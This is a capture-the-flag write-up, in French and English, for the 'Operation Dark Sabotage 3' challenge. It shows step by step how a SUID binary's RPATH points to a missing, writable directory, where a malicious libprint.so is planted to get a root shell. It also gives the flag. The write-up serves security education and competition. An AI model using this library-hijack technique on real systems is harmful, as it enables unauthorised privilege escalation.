# Operation Dark Sabotage 3

## Write-up FR

On constate que le binaire `exploit_me` est un exécutable `SUID`, ce qui suggère qu'il peut être exploité.

En l'analysant avec Ghidra, on remarque qu'il appelle la fonction `print_hello`. Cependant, cette fonction n'est pas présente dans le binaire lui-même, ce qui signifie qu'elle provient d'une bibliothèque partagée.
On va donc regarder les libs utilisés par le binaire : 
```bash
$ ldd exploit_me 
        linux-vdso.so.1 (0x00007fff661a9000)
        libprint.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007260cec4b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007260cee68000)
```
On voit la lib `libprint.so `. Examinons cette lib :
```bash
$ objdump -T libprint.so 

libprint.so:     file format elf64-x86-64

DYNAMIC SYMBOL TABLE:
0000000000000000  w   D  *UND*  0000000000000000  Base        _ITM_deregisterTMCloneTable
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) puts
0000000000000000  w   D  *UND*  0000000000000000  Base        __gmon_start__
0000000000000000  w   D  *UND*  0000000000000000  Base        _ITM_registerTMCloneTable
0000000000000000  w   DF *UND*  0000000000000000 (GLIBC_2.2.5) __cxa_finalize
0000000000001120 g    DF .text  0000000000000010  Base        print_hello
```
La fonction `print_hello` y est bien présente.

Le binaire ne trouve pas `libprint.so`, donc nous devons vérifier où il s'attend à la trouver :
```bash
$ readelf -d exploit_me 

Dynamic section at offset 0x2da8 contains 29 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libprint.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000f (RPATH)              Library rpath: [/home/c-3po/libs/]
...

$ ls -l /home/c-3po/libs/
ls: cannot access '/home/c-3po/libs/': No such file or directory
```
Le `RPATH` est défini sur `/home/c-3po/libs/`, mais ce dossier n'existe pas. 
Cependant, on a un accès en écriture sur `/home/c-3po/`.
On va donc créer le dossier `libs` et mettre une lib `libprint.so` malveillante avec une fonction `print_hello` :
```bash
$ mkdir /home/c-3po/libs/
$ gcc -shared -fPIC -o libs/libprint.so evil.c
$ ldd exploit_me 
        linux-vdso.so.1 (0x00007ffeb6525000)
        libprint.so => /home/c-3po/libs/libprint.so (0x000077db16ed7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x000077db16cc1000)
        /lib64/ld-linux-x86-64.so.2 (0x000077db16ee3000)
$ ./exploit_me 
# whoami 
root
```

## Write-up EN

We observe that the `exploit_me` binary is a `SUID` executable, which suggests it may be exploitable.

By analyzing it with Ghidra, we notice that it calls the `print_hello` function. However, this function is not present within the binary itself, meaning it comes from a shared library.
We check which shared libraries the binary relies on :
```bash
$ ldd exploit_me 
        linux-vdso.so.1 (0x00007fff661a9000)
        libprint.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007260cec4b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007260cee68000)
```
We see that libprint.so is a required library. Let's examine it :
```bash
$ objdump -T libprint.so 

libprint.so:     file format elf64-x86-64

DYNAMIC SYMBOL TABLE:
0000000000000000  w   D  *UND*  0000000000000000  Base        _ITM_deregisterTMCloneTable
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) puts
0000000000000000  w   D  *UND*  0000000000000000  Base        __gmon_start__
0000000000000000  w   D  *UND*  0000000000000000  Base        _ITM_registerTMCloneTable
0000000000000000  w   DF *UND*  0000000000000000 (GLIBC_2.2.5) __cxa_finalize
0000000000001120 g    DF .text  0000000000000010  Base        print_hello
```
The `print_hello` function is indeed present in the library.
Since `libprint.so` is not found, we need to determine where the binary expects it to be :
```bash
$ readelf -d exploit_me 

Dynamic section at offset 0x2da8 contains 29 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libprint.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000f (RPATH)              Library rpath: [/home/c-3po/libs/]
...

$ ls -l /home/c-3po/libs/
ls: cannot access '/home/c-3po/libs/': No such file or directory
```
The `RPATH` is set to `/home/c-3po/libs/`, but this directory does not exist.
Since we control this path, we can create the missing directory and place a malicious `libprint.so` containing a modified `print_hello` function :
```bash
$ mkdir /home/c-3po/libs/
$ gcc -shared -fPIC -o libs/libprint.so evil.c
$ ldd exploit_me 
        linux-vdso.so.1 (0x00007ffeb6525000)
        libprint.so => /home/c-3po/libs/libprint.so (0x000077db16ed7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x000077db16cc1000)
        /lib64/ld-linux-x86-64.so.2 (0x000077db16ee3000)
$ ./exploit_me 
# whoami 
root
```

## Flag

`polycyber{d3str0y_4ll_th3_dr01ds}`